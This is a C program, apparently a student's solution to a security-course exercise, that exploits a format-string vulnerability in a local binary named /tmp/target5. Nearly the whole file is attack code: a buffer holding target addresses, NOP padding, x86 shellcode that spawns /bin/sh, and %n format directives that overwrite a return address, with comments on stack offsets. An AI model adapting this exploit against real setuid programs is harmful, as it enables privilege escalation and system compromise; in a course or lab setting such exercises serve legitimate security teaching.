#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[] = "\x2c\xfe\xff\xbf\x90\x90\x90\x90" //first half of the addr, padded with NOPs
  "\x2d\xfe\xff\xbf" 		  //second half of the addr  
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"
  "%191u%5$n%12582661u%7$n"; //the format portion of the code -- MUST be last, otherwise it'll overwrite shell code in buffer
    //first %n writes to the last byte of addr. second %n writes to first three bytes of addr (was having problems writing entire addr in one go)

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
//"offset" for stack args seems to be 5. That is, the pointer  we need to write into is at 5$, second pointer is at 7$
//shell currently starts at 0xbffffdf8

